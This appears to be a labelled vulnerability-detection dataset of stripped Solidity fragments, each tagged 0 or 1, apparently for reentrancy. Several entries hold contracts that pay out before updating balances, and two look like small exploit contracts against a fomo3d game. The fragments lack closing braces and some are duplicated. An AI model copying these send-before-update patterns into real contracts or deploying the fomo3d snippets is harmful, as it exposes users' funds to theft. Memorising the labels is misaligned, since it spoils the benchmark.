function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
1531 26188.sol
26188.sol
function GetPrizeFund() public payable {
require(now>EndTime);
require(Bids[msg.sender]>=MaxOffer);
uint prizeAmount = Bids[msg.sender]+PrizeFund;
PrizeFund = 0;
Bids[msg.sender]=0;
msg.sender.call.value(prizeAmount);
function RevokeBid() public payable {
require(now>EndTime);
uint toTransfer = Bids[msg.sender];
Bids[msg.sender]=0;
msg.sender.call.value(toTransfer);
0
---------------------------------
1532 2021.sol
2021.sol
function _unsafeSend(address _to, uint _value) internal returns(bool) {
return _to.call.value(_value)();
function _safeSend(address _to, uint _value) internal {
if (!_unsafeSend(_to, _value)) {
throw;
0
---------------------------------
1533 14274.sol
14274.sol
function withdraw(uint _amount) {
require(tokens[0][msg.sender] >= _amount);
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], _amount);
if (!msg.sender.call.value(_amount)()) {
revert();
Withdraw(0, msg.sender, _amount, tokens[0][msg.sender]);
function instantTrade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive,   uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount, address _store) payable {
uint totalValue = safeMul(_amount, 1004) / 1000;
if (_tokenGet == address(0)) {
if (msg.value != totalValue) {
revert();
TokenStore(_store).deposit.value(totalValue)();
} else {
if (!Token(_tokenGet).transferFrom(msg.sender, this, totalValue)) {
revert();
if (!Token(_tokenGet).approve(_store, totalValue)) {
revert();
TokenStore(_store).depositToken(_tokenGet, totalValue);
TokenStore(_store).trade(_tokenGet, _amountGet, _tokenGive, _amountGive,
_expires, _nonce, _user, _v, _r, _s, _amount);
totalValue = TokenStore(_store).balanceOf(_tokenGive, this);
uint customerValue = safeMul(_amountGive, _amount) / _amountGet;
if (_tokenGive == address(0)) {
TokenStore(_store).withdraw(totalValue);
msg.sender.transfer(customerValue);
} else {
TokenStore(_store).withdrawToken(_tokenGive, totalValue);
if (!Token(_tokenGive).transfer(msg.sender, customerValue)) {
revert();
0
---------------------------------
1534 40341.sol
40341.sol
function carefulSendWithFixedGas(address _toAddress,  uint _valueWei,  uint _extraGasIncluded ) internal returns (bool success) {
return _toAddress.call.value(_valueWei).gas(_extraGasIncluded)();
contract FundsHolderMixin is ReentryProtectorMixin, CarefulSenderMixin {
mapping (address => uint) funds;
event FundsWithdrawnEvent(
address fromAddress,
address toAddress,
uint valueWei
);
function withdrawFundsAdvancedRP(address _toAddress, uint _valueWei, uint _extraGasIncluded ) internal {
if (msg.value != 0) {   throw;   }
address fromAddress = msg.sender;
if (_valueWei > funds[fromAddress]) {  throw;    }
funds[fromAddress] -= _valueWei;
bool sentOk = carefulSendWithFixedGas(  _toAddress,   _valueWei,   _extraGasIncluded );
if (!sentOk) { throw;   }
FundsWithdrawnEvent(fromAddress, _toAddress, _valueWei);
contract MoneyRounderMixin {
function compensateLatestMonarch(uint _compensationWei) internal {
address compensationAddress = latestMonarchInternal().compensationAddress;
latestMonarchInternal().compensationWei = _compensationWei;
bool sentOk = carefulSendWithFixedGas(  compensationAddress, _compensationWei,suggestedExtraGasToIncludeWithSends  );
if (sentOk) {
CompensationSentEvent(compensationAddress, _compensationWei);
} else {
funds[compensationAddress] += _compensationWei;
CompensationFailEvent(compensationAddress, _compensationWei);
contract KingdomFactory {
0
---------------------------------
1535 SendBalance.sol
SendBalance.sol
function withdrawBalance(){
if (!(msg.sender.call.value(userBalances[msg.sender])())) { throw ; }
userBalances[msg.sender] = 0;
1
---------------------------------
1536 39866.sol
39866.sol
function funding() payable {
if(fundingLock||block.number<startBlock||block.number>startBlock+blockDuration) throw;
if(balances[msg.sender]>balances[msg.sender]+msg.value*fundingExchangeRate || msg.value>msg.value*fundingExchangeRate) throw;
if(!fundingAccount.call.value(msg.value)()) throw;
balances[msg.sender]+=msg.value*fundingExchangeRate;
Funding(msg.sender,msg.value);
function buy(string _commit) payable{
if(balances[msg.sender]>balances[msg.sender]+msg.value*price || msg.value>msg.value*price) throw;
if(!fundingAccount.call.value(msg.value)()) throw;
balances[msg.sender]+=msg.value*price;
commit[msg.sender]=_commit;
Buy(msg.sender,msg.value);
1
---------------------------------
1537 39127.sol
39127.sol
function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers {
Proposal p = proposals[_proposalID];
if (p.state != ProposalState.Passed) throw;
p.state = ProposalState.Executed;
if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; }
ProposalExecutedEvent(_proposalID);
0
---------------------------------
1538 39912.sol
39912.sol
function simulatePathwayFromBeneficiary() public payable {
bytes4 buySig = bytes4(sha3("buy()"));
if (!Resilience.call.value(msg.value)(buySig)) throw;
bytes4 transferSig = bytes4(sha3("transfer(address,uint256)"));
if (!Resilience.call(transferSig, msg.sender, msg.value)) throw;
0
---------------------------------
1539 34577.sol
34577.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId)   public   ownerExists(msg.sender)    notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1540 cross-function-reentrancy-fixed.sol
cross-function-reentrancy-fixed.sol
function untrustedWithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
if (recipient.call.value(amountToWithdraw)() == false) {  throw;}
function untrustedGetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) {throw;}
claimedBonus[recipient] = true;
rewardsForA[recipient] += 100;
untrustedWithdrawReward(recipient);
0
---------------------------------
1541 21999.sol
21999.sol
function call(address addr, bytes data, uint256 amount) public payable onlyOwner {
if (msg.value > 0)
deposit();
require(addr.call.value(amount)(data));
Call(msg.sender, addr, amount);
0
---------------------------------
1542 21755.sol
21755.sol
function Collect(uint _am) public payable  {
var acc = Acc[msg.sender];
if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {
if(msg.sender.call.value(_am)())  {
acc.balance-=_am;
LogFile.AddMessage(msg.sender,_am,"Collect");
function()     public     payable   {
Put(0);
contract Log
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1543 16884.sol
16884.sol
function mintETHRewards(address _contract,  uint256 _amount) public onlyManager() {
require(_contract.call.value(_amount)());
0
---------------------------------
1544 23803.sol
23803.sol
function () payable {
if (!founder.call.value(msg.value)()) revert();
0
---------------------------------
1545 22074.sol
22074.sol
function Collect(uint _am) public payable {
if(Bal[msg.sender]>=MinSum && _am<=Bal[msg.sender]) {
msg.sender.call.value(_am);
Bal[msg.sender]-=_am;
1
---------------------------------
1546 39326.sol
39326.sol
function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers {
Proposal p = proposals[id];
if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw;
if (p.currentResult > majorityMargin) {
p.executed = true;
if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw;
p.proposalPassed = true;
} else {
p.proposalPassed = false;
ProposalTallied(id, p.numberOfVotes, p.proposalPassed);
library CreatorCongress {
0
---------------------------------
1547 5629.sol
5629.sol
constructor () public payable {
fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1));
require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)());
(,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this));
require(winnings > 0.1 ether);
fomo.withdraw();
selfdestruct(msg.sender);
0
---------------------------------
1548 3270.sol
3270.sol
function gotake() public {
if (fomo3d.getTimeLeft() > 50) { revert(); }
address(fomo3d).call.value(fomo3d.getBuyPrice() *2 )();
fomo3d.withdraw();
0
---------------------------------
1549 16925.sol
16925.sol
function withdraw() public{
assert(msg.sender.call.value(balances[msg.sender])()) ;
balances[msg.sender] = 0;
1
---------------------------------
1550 21390.sol
21390.sol
function FundTransfer(uint _am, bytes32 _operation, address _to, address _feeToAdr) payable  {
if(msg.sender != address(this)) throw;
if(_operation=="In")   {
FundsMove(msg.value,"In",_to);
investors[_to] += _am;
}  else {
uint amTotransfer = 0;
if(_to==_feeToAdr) {
amTotransfer=_am;
}  else {
amTotransfer=_am/100*99;
investors[_feeToAdr]+=_am-amTotransfer;
if(_to.call.value(_am)()==false) throw;
investors[_to] -= _am;
FundsMove(_am, "Out", _to);
function() payable {
In(msg.sender);
function Out(uint amount) payable {
if(investors[msg.sender]<targetAmount)throw;
if(investors[msg.sender]<amount)throw;
this.FundTransfer(amount,"",msg.sender,admin);
function In(address to) payable {
if(to==0x0)to = admin;
if(msg.sender!=tx.origin)throw;
this.FundTransfer(msg.value, "In", to,admin);
1
---------------------------------
1551 2387.sol
2387.sol
function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) {
require(to != address(this) && data.length >= 68 &&   transfer(to, value));
assembly {
mstore(add(data, 36), value)
mstore(add(data, 68), caller)
require(to.call.value(msg.value)(data));
return true;
1
---------------------------------
1552 14458.sol
14458.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenNotPaused notSelf(_to) returns (bool success){
require(_to != address(0));
if(isContract(_to)) {
if(accountBalances[msg.sender].addressBalance < _value){
revert();
if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){
revert();
isNewRound();
subFromAddressBalancesInfo(msg.sender, _value);
addToAddressBalancesInfo(_to, _value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(msg.sender, _to, _value, _data);
0
---------------------------------
1553 30101.sol
30101.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
1554 9600.sol
9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1555 40425.sol
40425.sol
function BankOwner_WithdrawDonations() public modifier_isContractOwner()  modifier_wasValueSent() {
if (_bankDonationsBalance > 0) {
uint256 amount_ = _bankDonationsBalance;
_bankDonationsBalance = 0;
if (msg.sender.send(amount_)) {
event_bankDonationsWithdrawn(amount_);
}  else if (msg.sender.call.value(amount_)())  {
event_bankDonationsWithdrawn(amount_);
}  else {
_bankDonationsBalance = amount_;
function WithdrawAmountFromBankAccount(uint256 amount) public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) {
bool withdrawalSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  {
_bankAccountsArray[accountNumber_].balance -= amount;
if (msg.sender.send(amount))   {
withdrawalSuccessful_ = true;
else if (msg.sender.call.value(amount)()) {
withdrawalSuccessful_ = true;
}  else {
_bankAccountsArray[accountNumber_].balance += amount;
if (withdrawalSuccessful_)  {
event_withdrawalMadeFromBankAccount_Successful(accountNumber_, amount);
return true;
}  else {
event_withdrawalMadeFromBankAccount_Failed(accountNumber_, amount);
return false;
function WithdrawFullBalanceFromBankAccount() public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool)  {
bool withdrawalSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
uint256 fullBalance_ = 0;
if (_bankAccountsArray[accountNumber_].balance > 0)   {
fullBalance_ = _bankAccountsArray[accountNumber_].balance;
_bankAccountsArray[accountNumber_].balance = 0;
if (msg.sender.send(fullBalance_))   {
withdrawalSuccessful_ = true;
}else
if (msg.sender.call.value(fullBalance_)())  {
withdrawalSuccessful_ = true;
} else {
_bankAccountsArray[accountNumber_].balance = fullBalance_;
if (withdrawalSuccessful_)  {
event_withdrawalMadeFromBankAccount_Successful(accountNumber_, fullBalance_);
return true;
}  else {
event_withdrawalMadeFromBankAccount_Failed(accountNumber_, fullBalance_);
return false;
function TransferAmountFromBankAccountToAddress(uint256 amount, address destinationAddress) public  modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) {
bool transferSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  {
_bankAccountsArray[accountNumber_].balance -= amount;
if (destinationAddress.send(amount))  {
transferSuccessful_ = true;
} else if (destinationAddress.call.value(amount)())      {
transferSuccessful_ = true;
} else {
_bankAccountsArray[accountNumber_].balance += amount;
if (transferSuccessful_)  {
event_transferMadeFromBankAccountToAddress_Successful(accountNumber_, amount, destinationAddress);
return true;
} else {
event_transferMadeFromBankAccountToAddress_Failed(accountNumber_, amount, destinationAddress);
return false;
0
---------------------------------
1556 1710.sol
1710.sol
function buyFST0(address receiver) internal {
require(salesPipe.call.value(msg.value)());
uint256 tmpERCBalance = erc.balanceOf(address(this));
uint256 tmpEthBalance = address(this).balance;
if (tmpERCBalance > 0) {
require(erc.transfer(receiver, tmpERCBalance));    }
if (tmpEthBalance > 0) {
require(receiver.send(tmpEthBalance));
function buyFST (address receiver) public payable {
buyFST0(receiver);
function buyFST () public payable {
buyFST0(msg.sender);
function () external payable {
buyFST0(msg.sender);
0
---------------------------------
1557 40038.sol
40038.sol
function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) {
if (_to == address(tokenCtr)) throw;
if (underLimit(_value)) {
SingleTransact(msg.sender, _value, _to, _data);
if(!_to.call.value(_value)(_data))
return 0;
_r = sha3(msg.data, block.number);
if (!confirm(_r) && m_txs[_r].to == 0) {
m_txs[_r].to = _to;
m_txs[_r].value = _value;
m_txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (m_txs[_h].to != 0) {
if(!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))
MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data);
delete m_txs[_h];
return true;
1
---------------------------------
1558 9221.sol
9221.sol
function bet() payable {
if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  {
if (!msg.sender.call.value(2 ether)())
throw;
function releaseFunds(uint amount) {
if (gameOwner==msg.sender)  {
if (!msg.sender.call.value( amount * (1 ether))())
throw;
0
---------------------------------
1559 3255.sol
3255.sol
function endRound(LOLdatasets.EventReturns memory _eventData_)
private
returns (LOLdatasets.EventReturns)
uint256 _rID = rID_;
uint256 _winPID = round_[_rID].plyr;
uint256 _winTID = round_[_rID].team;
uint256 _pot = round_[_rID].pot;
uint256 _win = (_pot.mul(48)) / 100;
uint256 _com = (_pot / 50);
uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
if (_dust > 0)
_gen = _gen.sub(_dust);
_res = _res.add(_dust);
plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
if (!address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _p3d.add(_com);
_com = 0;
round_[_rID].mask = _ppt.add(round_[_rID].mask);
_eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
_eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
_eventData_.winnerAddr = plyr_[_winPID].addr;
_eventData_.winnerName = plyr_[_winPID].name;
_eventData_.amountWon = _win;
_eventData_.genAmount = _gen;
_eventData_.P3DAmount = 0;
_eventData_.newPot = _res;
rID_++;
_rID++;
round_[_rID].strt = now;
round_[_rID].end = now.add(rndInit_).add(rndGap_);
round_[_rID].pot = _res;
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_)
private
returns(LOLdatasets.EventReturns)
uint256 _com = _eth / 50;
uint256 _p3d;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit LOLevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_com = _com.add(_aff);
address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()")));
return(_eventData_);
0
---------------------------------
1560 39705.sol
39705.sol
function empty() returns (bool) {
return foundationWallet.call.value(this.balance)();
function donateAs(address addr) private returns (bool) {
state st = getState();
if (st != state.round0 && st != state.round1) { throw; }
if (msg.value < minDonation) { throw; }
if (weiPerCHF == 0) { throw; }
totalWeiDonated += msg.value;
weiDonated[addr] += msg.value;
uint chfCents = (msg.value * 100) / weiPerCHF;
bookDonation(addr, now, chfCents, "ETH", "");
return foundationWallet.call.value(this.balance)();
0
---------------------------------
1561 39664.sol
39664.sol
function migrateBlockjack() only(ADMIN_CONTRACT) {
stopBlockjack();
if (currentBankroll > initialBankroll) {
if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw;
suicide(DX);
function shareProfits() onlyOwner {
if (profitsLockedUntil > now) throw;
if (currentBankroll <= initialBankroll) throw;
uint256 profit = currentBankroll - initialBankroll;
if (!ADMIN_CONTRACT.call.value(profit)()) throw;
currentBankroll -= profit;
bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD;
profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD;
0
---------------------------------
1562 12182.sol
12182.sol
function transferEther(address to, uint256 amount) public returns (bool) {
require(msg.sender == owner);
return to.call.value(amount)();
function() public payable {}
contract Controller is ControllerStorage, Ownable, HasWorkers {
event CreatedUserWallet(address _wallet);
event WithdrawEth(address _wallet, address _to, uint256 _amount);
event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount);
event ChangedForward(address _old, address _new, address _operator);
constructor() public {
setForward(msg.sender);
function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) {
return destination.call.value(value)(_bytes);
function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) {
uint256 size = wallets.length;
uint256 balance;
Wallet wallet;
for (uint256 i = 0; i < size; i++) {
wallet = wallets[i];
balance = wallet.balance;
if (wallet.transferEther(this, balance)) {
emit WithdrawEth(wallet, forward, balance);
forward.call.value(address(this).balance)();
return true;
0
---------------------------------
1563 13952.sol
13952.sol
function removeBankroll(uint _amount, string _callbackFn)
public
returns (uint _recalled)
address _bankroller = msg.sender;
uint _collateral = getCollateral();
uint _balance = address(this).balance;
uint _available = _balance > _collateral ? _balance - _collateral : 0;
if (_amount > _available) _amount = _available;
_amount = ledger.subtract(_bankroller, _amount);
bankroll = ledger.total();
if (_amount == 0) return;
bytes4 _sig = bytes4(keccak256(_callbackFn));
require(_bankroller.call.value(_amount)(_sig));
emit BankrollRemoved(now, _bankroller, _amount, bankroll);
return _amount;
function sendProfits()
public
returns (uint _profits)
int _p = profits();
if (_p <= 0) return;
_profits = uint(_p);
profitsSent += _profits;
address _tr = getTreasury();
require(_tr.call.value(_profits)());
emit ProfitsSent(now, _tr, _profits);
function _betFailure(string _msg, uint _bet, bool _doRefund)
private
if (_doRefund) require(msg.sender.call.value(_bet)());
emit BetFailure(now, msg.sender, _bet, _msg);
function _uncreditUser(address _user, uint _amt)
private
if (_amt > credits[_user] || _amt == 0) _amt = credits[_user];
if (_amt == 0) return;
vars.totalCredits -= uint88(_amt);
credits[_user] -= _amt;
require(_user.call.value(_amt)());
emit CreditsCashedout(now, _user, _amt);
1
---------------------------------
1564 21886.sol
21886.sol
function buy(address recipient, uint256 value) public payable {
if (value> msg.value) throw;
if (value < msg.value) {
require(msg.sender.call.value(msg.value - value)());
buyToken(recipient, value);
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw;
if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw;
uint tokens = safeMul(value, price());
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
totalEtherRaised = safeAdd(totalEtherRaised, value);
if (block.number<=startBlock+prePeriod) {
presaleTokenSupply = safeAdd(presaleTokenSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
1
---------------------------------
1565 39973.sol
39973.sol
function _unsafeSend(address _to, uint _value) internal returns(bool) {
return _to.call.value(_value)();
function _forward(address _to, bytes _data) internal returns(bool, bool) {
uint startGas = msg.gas + forwardCallGas + (_data.length * 50);
if (_to == 0x0) {
return (false, _safeFalse());
if (!_to.call.value(msg.value)(_data)) {
return (false, _safeFalse());
return (true, _applyRefund(startGas));
function checkForward(bytes _data) constant returns(bool, bool) {
return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data);
function checkForward(bytes _data) constant returns(bool, bool) {
return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data);
1
---------------------------------
1566 10715.sol
10715.sol
function approveAndCall(address _spender,  uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender,uint _addedValue,bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract AtripToken is ERC827Token {
using SafeMath for uint256;
string public name = "Atrip Token";
string public symbol = "APK";
uint public decimals = 18;
address public wallet = 0x0;
1
---------------------------------
1567 30460.sol
30460.sol
function close() onlyOwner public {
require(state == State.Active);
state = State.Closed;
Closed();
wallet.call.value(this.balance)();
function forwardFunds() onlyOwner public {
require(this.balance > 0);
wallet.call.value(this.balance)();
contract FinalizableCrowdsale is BurnableCrowdsale, Ownable {
using SafeMath for uint256;
bool public isFinalized = false;
event Finalized();
function forwardFundsToWallet(uint256 amount) internal {
if (goalReached() && vault.balance > 0) {
vault.forwardFunds();
if (goalReached()) {
wallet.call.value(amount)();
} else {
vault.deposit.value(amount)(msg.sender);
0
---------------------------------
1568 4679.sol
4679.sol
function giveToken(address _buyer) internal {
require( pendingTokenUser[_buyer] > 0, "pendingTokenUser[_buyer] > 0" );
tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]);
tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]);
soldTokens = soldTokens.add(pendingTokenUser[_buyer]);
pendingTokenUser[_buyer] = 0;
require( address(tokenSaleContract).call.value( etherUser[_buyer] )( bytes4( keccak256("forwardEther()") ) ) );
etherUser[_buyer] = 0;
function forwardEther() onlyRC payable public returns(bool) {
require(milestoneSystem.call.value(msg.value)(), "wallet.call.value(msg.value)()");
return true;
0
---------------------------------
1569 40340.sol
40340.sol
function withdrawFunds(uint amount) {
if (accountIDs[msg.sender]>0) {
if (int(amount)<=getFunds(msg.sender, true) && int(amount)>0) {
accounts[accountIDs[msg.sender]].capital -= int(amount);
msg.sender.call.value(amount)();
Withdraw(msg.sender, amount, accounts[accountIDs[msg.sender]].capital);
function expire(uint accountID, uint8 v, bytes32 r, bytes32 s, bytes32 value) {
if (expired == false) {
if (ecrecover(sha3(factHash, value), v, r, s) == ethAddr) {
uint lastAccount = numAccounts;
if (accountID==0) {
accountID = 1;
} else {
lastAccount = accountID;
for (accountID=accountID; accountID<=lastAccount; accountID++) {
if (positions[accounts[accountID].user].expired == false) {
int result = positions[accounts[accountID].user].cash / 1000000000000000000;
for (uint optionID=0; optionID<numOptions; optionID++) {
int moneyness = getMoneyness(options[optionID], uint(value), margin);
result += moneyness * positions[accounts[accountID].user].positions[optionID] / 1000000000000000000;
positions[accounts[accountID].user].expired = true;
uint amountToSend = uint(accounts[accountID].capital + result);
accounts[accountID].capital = 0;
if (positions[accounts[accountID].user].hasPosition==true) {
numPositionsExpired++;
accounts[accountID].user.call.value(amountToSend)();
Expire(msg.sender, accounts[accountID].user);
if (numPositionsExpired == numPositions) {
expired = true;
0
---------------------------------
1570 2387_1.sol
2387_1.sol
function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) {
require(to != address(this) && data.length >= 68 &&   transfer(to, value));
assembly {
mstore(add(data, 36), value)
mstore(add(data, 68), caller)
require(to.call.value(msg.value)(data));
return true;
1
---------------------------------
1571 21697_1.sol
21697_1.sol
function Jump() public payable  {
if(msg.value > 1 ether)  {
msg.sender.call.value(this.balance);
1
---------------------------------
1572 24007_1.sol
24007_1.sol
function GetEther() public payable {
if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) {
msg.sender.call.value(0.3 ether);
ExtractDepositTime[msg.sender] = 0;
1
---------------------------------
1573 23803_1.sol
23803_1.sol
function () payable {
if (!founder.call.value(msg.value)()) revert();
0
---------------------------------
1574 39326_1.sol
39326_1.sol
function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers {
Proposal p = proposals[id];
if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw;
if (p.currentResult > majorityMargin) {
p.executed = true;
if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw;
p.proposalPassed = true;
} else {
p.proposalPassed = false;
ProposalTallied(id, p.numberOfVotes, p.proposalPassed);
library CreatorCongress {
0
---------------------------------
1575 30101_1.sol
30101_1.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
1576 9221_1.sol
9221_1.sol
function bet() payable {
if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  {
if (!msg.sender.call.value(2 ether)())
throw;
function releaseFunds(uint amount) {
if (gameOwner==msg.sender)  {
if (!msg.sender.call.value( amount * (1 ether))())
throw;
0
---------------------------------
1577 39705_1.sol
39705_1.sol
function empty() returns (bool) {
return foundationWallet.call.value(this.balance)();
function donateAs(address addr) private returns (bool) {
state st = getState();
if (st != state.round0 && st != state.round1) { throw; }
if (msg.value < minDonation) { throw; }
if (weiPerCHF == 0) { throw; }
totalWeiDonated += msg.value;
weiDonated[addr] += msg.value;
uint chfCents = (msg.value * 100) / weiPerCHF;
bookDonation(addr, now, chfCents, "ETH", "");
return foundationWallet.call.value(this.balance)();
0
---------------------------------
1578 39664_1.sol
39664_1.sol
function migrateBlockjack() only(ADMIN_CONTRACT) {
stopBlockjack();
if (currentBankroll > initialBankroll) {
if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw;
suicide(DX);
function shareProfits() onlyOwner {
if (profitsLockedUntil > now) throw;
if (currentBankroll <= initialBankroll) throw;
uint256 profit = currentBankroll - initialBankroll;
if (!ADMIN_CONTRACT.call.value(profit)()) throw;
currentBankroll -= profit;
bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD;
profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD;
0
---------------------------------
1579 12182_1.sol
12182_1.sol
function transferEther(address to, uint256 amount) public returns (bool) {
require(msg.sender == owner);
return to.call.value(amount)();
function() public payable {}
contract Controller is ControllerStorage, Ownable, HasWorkers {
event CreatedUserWallet(address _wallet);
event WithdrawEth(address _wallet, address _to, uint256 _amount);
event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount);
event ChangedForward(address _old, address _new, address _operator);
constructor() public {
setForward(msg.sender);
function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) {
return destination.call.value(value)(_bytes);
function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) {
uint256 size = wallets.length;
uint256 balance;
Wallet wallet;
for (uint256 i = 0; i < size; i++) {
wallet = wallets[i];
balance = wallet.balance;
if (wallet.transferEther(this, balance)) {
emit WithdrawEth(wallet, forward, balance);
